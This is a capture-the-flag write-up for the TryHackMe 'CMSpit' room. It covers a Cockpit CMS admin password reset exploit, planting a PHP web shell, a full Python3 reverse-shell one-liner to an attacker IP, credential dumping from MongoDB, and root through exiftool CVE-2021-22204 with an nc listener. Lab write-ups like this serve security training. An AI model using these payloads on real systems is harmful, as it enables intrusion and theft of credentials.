# CMSpit @Tryhackme

![image](https://user-images.githubusercontent.com/5285547/127918281-efb297cf-e998-44f4-b493-01c9b8fac058.png)

Room: https://tryhackme.com/room/cmspit  
Rating: Medium

## Recon

Nmap 

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Let's cehck out port 80

We get brought straight to a login page. 

```
http://10.10.98.193/auth/login?to=/
```
![image](https://user-images.githubusercontent.com/5285547/127918935-ef823bcd-273d-4a09-a33f-7d341e643645.png)

We have no login credentials now, so we need to check the web app out further. 

Capturing the request in bursuite I notice a csfr token.

![image](https://user-images.githubusercontent.com/5285547/127920619-d634688d-611c-4719-a82b-5341bf00fdaa.png)

I've not seen a request like this before for a login, so did some research on   
google. 

I found a great article explaining how to get RCE here: https://swarm.ptsecurity.com/rce-cockpit-cms/

Using the infomation I was able to leak some info from the backend database via "/auth/check" endpoint

![image](https://user-images.githubusercontent.com/5285547/127921184-ed70735b-e714-460f-a5bc-84a154b30e16.png)

## Admin reset password. 

Now its time to use the info to reset the admins passowrd. 

1. Access /auth/requestreset to generate a token for resetting the password of the selected user:

![image](https://user-images.githubusercontent.com/5285547/127921765-f6580893-bace-4f65-a80e-17ec7ba7c0f7.png)

2. Extract tokens by using one of the methods just described (/auth/resetpassword or /auth/newpassword): 

![image](https://user-images.githubusercontent.com/5285547/127921548-cecbc904-325f-4cb4-8a2b-75f79cf748eb.png)

3. Extract user account data (username, password hash, API key, password reset token) using the /auth/newpassword method and the password reset tokens obtained in the previous step:

![image](https://user-images.githubusercontent.com/5285547/127922015-18b618a6-657a-4d6a-affe-212a3aa8df79.png)

4. Rest the password

![image](https://user-images.githubusercontent.com/5285547/127922136-60728f8b-efca-4508-b07a-2a8a7512fc59.png)

Now we can login to the admin page. 

In my case the details are.

```
admin:admin12345
```

This logs us in as the admin! :)

![image](https://user-images.githubusercontent.com/5285547/127922266-0f2ff384-f072-4b8d-8fe7-825f902d5569.png)


## RCE time

Checking out the webapp we see we can upload or create files in /finder.

```
http://10.10.98.193/finder
```

I choose to create a new file (web shell), Click create > file and make a basic webshell

![image](https://user-images.githubusercontent.com/5285547/127922510-616aa58d-1d7d-423d-87a3-596822e7424a.png)

Then click save (blue button, top right)

![image](https://user-images.githubusercontent.com/5285547/127922655-feb50931-af11-453e-9a26-3732f00e1ba6.png)

Now you can access the shell and prove code execution with 'id'

![image](https://user-images.githubusercontent.com/5285547/127922738-0aeea3e6-7608-43b8-a596-aa63ffbf2600.png)

Reverse shell payload (Python3) 

```
http://10.10.98.193/webshell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.153.120",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

![image](https://user-images.githubusercontent.com/5285547/127922869-878a38bc-88a8-4f80-aa03-2e00fd358eca.png)

Go ahead and upgrad your term. 

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo;fg 
reset
xterm
```

## User

Now we have system access as www-data we need to move to the next user with higher permissions. 
Looking about the system and running the standard linpeas. I noticed their was a mongo database to check out. 

Mongo db is not usually password procted on the system locally. 

```
www-data@ubuntu:/home$ mongo
MongoDB shell version: 2.6.10
connecting to: test
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        http://docs.mongodb.org/
Questions? Try the support group
        http://groups.google.com/group/mongodb-user
2021-08-02T14:01:42.514-0700 In File::open(), ::open for '' failed with errno:2 No such file or directory
> 
```

Let's see whats inside the database

```
show dbs
```

![image](https://user-images.githubusercontent.com/5285547/127923500-c5ab7f37-ebb0-48ff-b080-84d2629a59f3.png)

```
use sudousersbak
```
```
show collections
```
![image](https://user-images.githubusercontent.com/5285547/127923634-371bef6c-adee-42e6-aabd-8797974e206e.png)


```
db.user.find()
```

![image](https://user-images.githubusercontent.com/5285547/127923682-e4cffabf-d11b-4df6-94ac-adc71b1b0955.png)


Now we have the login details for stux, lets ssh into the box with the new details. 
And grab the user flag! 

![image](https://user-images.githubusercontent.com/5285547/127923801-61909fa0-4801-4a4f-8158-0995516a573d.png)


## Root

Using sudo -l instantly shows a privesc path. 

```
stux@ubuntu:~$ sudo -l
Matching Defaults entries for stux on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User stux may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/local/bin/exiftool
```

It seems that exiftool is vunerable to a certain file type djvu. 

I made a writeup here and explination: https://github.com/AssassinUKG/CVE-2021-22204

After you have made the exploitable image, uplaod it to the target and have a reverse shell listner ready. 


Listner

```
nc -lnvp 9999
```

Exploit image

```
sudo /usr/local/bin/exiftool panda.jpg 
```

You will then get a call back from the reverse shell as root!

![image](https://user-images.githubusercontent.com/5285547/127924346-9029ee9d-b230-4ed0-a201-9473538ac6fe.png)

Grab the last few flags to answer the rest of the questions. I have not told you all of the locations so you have something to aim for! 

I hope you enjoyed the box as much as i did! 

Take care, hacker crew 


